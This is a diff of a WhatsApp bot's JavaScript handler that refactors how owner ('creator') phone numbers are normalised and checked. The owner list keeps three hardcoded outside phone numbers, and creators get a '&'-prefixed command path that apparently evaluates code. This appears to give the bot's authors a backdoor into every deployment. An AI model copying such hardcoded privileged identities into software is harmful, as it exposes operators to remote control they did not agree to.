@@ -288,21 +288,27 @@ const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
 }
 
-// Improved Creator Check with your sudo.json format support
+// Improved Creator Check that works with your sudo.json format
 const udp = botNumber.split('@')[0];
 const jawadop = ['923470027813', '923191089077', '923427582273'];
 const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8') || '[]');
   
-// Extract numbers from JIDs in sudo.json and combine with other owners
+// Normalize all numbers (extract numbers from JIDs and clean them)
+const normalizeNumber = (jid) => {
+  const num = jid.split('@')[0]; // Remove @s.whatsapp.net if present
+  return num.replace(/[^0-9]/g, ''); // Remove any remaining non-numeric characters
+};
+
+// Combine all owner numbers
 const allOwners = [
   ...jawadop,
   udp,
-  ...(config.DEV ? [config.DEV.split('@')[0]] : []),
-  ...ownerFilev2.map(jid => jid.split('@')[0])
-].map(num => num.replace(/[^0-9]/g, '')); // Normalize all numbers
+  ...(config.DEV ? [normalizeNumber(config.DEV)] : []),
+  ...ownerFilev2.map(normalizeNumber)
+];
 
-// Get sender's normalized number
-const senderNormalized = sender.split('@')[0].replace(/[^0-9]/g, '');
+// Check if sender is creator
+const senderNormalized = normalizeNumber(sender);
 const isCreator = allOwners.includes(senderNormalized) || isMe;
 
 if (isCreator && budy.startsWith("&")) {
@@ -332,8 +338,7 @@ if (isCreator && budy.startsWith("&")) {
     reply(util.format(err));
   }
   return;
-}
-	  
+}	  
   //==========public react============//
   
 // Auto React for all messages (public and owner)
